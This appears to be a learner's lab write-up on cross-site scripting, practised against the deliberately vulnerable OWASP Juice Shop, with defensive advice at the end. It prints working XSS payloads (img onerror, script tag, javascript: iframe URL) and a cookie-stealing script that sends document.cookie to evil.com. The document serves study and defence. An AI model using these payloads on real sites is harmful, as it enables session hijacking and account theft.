# ğŸŒ Day 5 â€“ Understanding and Exploiting Cross-Site Scripting (XSS)

## ğŸ”¹ Introduction

Todayâ€™s focus is on **Cross-Site Scripting (XSS)** â€” one of the **most common and dangerous web vulnerabilities**.

At its core, XSS is about tricking a web application into executing **malicious JavaScript** inside the victimâ€™s browser.

Why is this scary?

Because if an attacker can run *any* code in your browser, they can:

- Steal your **cookies** or session tokens (account takeover).
- Modify the page you see (phishing, fake forms, redirecting).
- Spread malware.

Think of it like this:

ğŸ‘‰ The website is the stage.

ğŸ‘‰ The browser is the audience.

ğŸ‘‰ XSS lets attackers sneak their own script into the play â€” and the audience believes itâ€™s part of the original show.

---

## ğŸ”¹ Types of XSS

1. **Reflected XSS** (a one-time echo)
    - Payload is part of the request (URL, form input).
    - Reflected immediately in the response.
    - Works only when the victim clicks the crafted link.
    - ğŸ“– *Analogy*: Shouting into a cave and hearing your own echo right back.
2. **Stored XSS** (a permanent trap)
    - Payload gets stored in the database or server.
    - Every visitor sees the malicious script.
    - ğŸ“– *Analogy*: Graffiti sprayed on a public wall â€” everyone passing by sees it.
3. **DOM-Based XSS** (the client-side twist)
    - Payload is executed by client-side JavaScript, without touching the server.
    - Happens when developers manipulate the DOM with unsanitized input.
    - ğŸ“– *Analogy*: Writing your own sticky note and slapping it onto the appâ€™s UI â€” the system never knew it happened.

---

## ğŸ”¹ Our Lab Setup

We used **OWASP Juice Shop**, a purposely vulnerable web application, to practice exploiting XSS.

All attacks were carried out in a safe lab environment.

---

## ğŸ”¹ Practical Work

### 1. Reflected XSS

- **Payload used:**
    
    ```html
    <img src=x onerror=alert('XSS')>
    ```
    
- **Steps:**
    - Injected this payload into a search box.
    - Page reflected it back without escaping.
- **Result:**
    
    âœ… A popup appeared with **â€œXSSâ€**.
    
    - This proves the input was reflected directly into the page â†’ unsafe.

---

### 2. Stored XSS

- **Payload used (Feedback form):**
    
    ```html
    <script>alert('DOMXSS')</script>
    ```
    
- **Steps:**
    - Submitted this in the feedback/comment form.
    - Juice Shop saved the payload in its database.
    - On returning to the feedback page, the payload executed.
- **Result:**
    
    âœ… Every visitor to that page saw a popup **â€œDOMXSSâ€**.
    
    - In the real world, this could mean malicious scripts running for *all users*, not just us.

---

### 3. DOM-Based XSS

- **Observation:**
    
    When testing dynamic JavaScript functions, we saw console logs and error traces:
    
    Then I tried:
    
    ```
    ERROR Error: NG04002: 'DOMXSS'
    ```
    
    Then I tried:
    
    ```
    http://localhost:3000/#/search?q=<iframe src=javascript:alert('DOMXSS')>
    ```
    
- **Result:**

âœ… A popup also confirmed execution in some contexts.

- This shows the browser executed input directly in the **client-side DOM**, not through the server.

---

### 4. Theoretical Impact: Cookie Theft

- A dangerous payload could look like this:
    
    ```html
    <script>
    fetch("http://evil.com/steal?cookie=" + document.cookie)
    </script>
    ```
    
- If successful:
    - Attacker steals the victimâ€™s session cookie.
    - Victimâ€™s account can be hijacked.
- âš ï¸ We did **not** run this in practice (unsafe), but it demonstrates the real power of XSS.

---

## ğŸ”¹ Why This Matters

XSS isnâ€™t just about funny popups â€” itâ€™s about **trust**.

- If I can run JavaScript on your banking app, I can empty your account.
- If I can inject scripts in your email app, I can phish your password.
- If I can modify what you see, I control your reality.

Thatâ€™s why modern defenses exist:

- **Input validation** (never trust user input).
- **Output encoding** (escape special characters per context).
- **Content Security Policy (CSP)** to block inline scripts.

---

## ğŸ”¹ Key Takeaways

- **Reflected XSS** â†’ Comes from the request.
- **Stored XSS** â†’ Saved on the server, affects everyone.
- **DOM XSS** â†’ Purely client-side, from JavaScript handling input.
- Even in a small demo, we saw how XSS could persist, reflect, and execute.
- Real-world impact goes far beyond alerts â†’ session hijacking, data theft, and phishing.

---

## ğŸ”¹ Evidence from Our Lab

- Reflected XSS popup: **â€œXSSâ€** âœ…
- Stored XSS popup: **â€œDOMXSSâ€** âœ…
- DOM-based XSS console logs + popup âœ…

---

## âœ… Conclusion

Todayâ€™s lesson on **Cross-Site Scripting** showed us not just how to exploit it, but also why itâ€™s dangerous.

Every popup was proof that the browser was executing *our* code instead of just the websiteâ€™s.

ğŸ“Œ For developers: Always validate and escape input in the right context.

ğŸ“Œ For learners: Never stop at â€œalert(1)â€ â€” always ask: *â€œWhat could an attacker do with this?â€*